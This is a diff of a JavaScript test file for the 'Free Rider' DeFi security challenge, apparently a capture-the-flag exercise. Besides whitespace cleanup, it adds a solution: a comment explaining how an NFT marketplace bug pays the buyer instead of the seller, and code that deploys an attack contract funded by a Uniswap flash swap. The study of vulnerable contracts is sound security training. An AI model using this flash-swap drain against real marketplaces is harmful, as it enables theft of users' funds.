@@ -45,7 +45,7 @@ describe('[Challenge] Free Rider', function () {
             this.uniswapFactory.address,
             this.weth.address
         );
-        
+
         // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
         // Note that the function takes care of deploying the pair automatically
         await this.token.approve(
@@ -61,7 +61,7 @@ describe('[Challenge] Free Rider', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
-        
+
         // Get a reference to the created Uniswap pair
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
         this.uniswapPair = await UniswapPairFactory.attach(
@@ -98,13 +98,44 @@ describe('[Challenge] Free Rider', function () {
         // Deploy buyer's contract, adding the attacker as the partner
         this.buyerContract = await (await ethers.getContractFactory('FreeRiderBuyer', buyer)).deploy(
             attacker.address, // partner
-            this.nft.address, 
+            this.nft.address,
             { value: BUYER_PAYOUT }
         );
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        /**
+         * EXPLOT:
+         * 
+         * The NFT marketplace has a bug in its `_buyOne` method.
+         * The bug is that the NFT is transfered using `safeTransferFrom`
+         * which sets the buyer as the owner.
+         * Then the ETH value of the purchase is suppossed to be sent to the seller,
+         * however it is sent to the owner of the NFT which was just tranferred, 
+         * as such the owner is now the buyer of the NFT.
+         * As such the buyer gains both the NFT and receives the payment for the sale.
+         * 
+         * Therefore the attacker only needs enough to be buy 1 NFT, 
+         * as they will receive the purchase value back.
+         * 
+         * The attacker can get enough ETH to buy an NFT via the Uniswap pair's
+         * flash swap
+         */
+
+        //deploy attack contract
+        this.attackContract = await (await ethers.getContractFactory('AttackFreeRider', attacker)).deploy(
+            this.weth.address,
+            this.nft.address,
+            this.uniswapPair.address,
+            this.marketplace.address,
+            this.buyerContract.address
+        );
+
+        //call attacked method
+        await this.attackContract.attack(ethers.utils.parseEther('15'))
+
     });
 
     after(async function () {
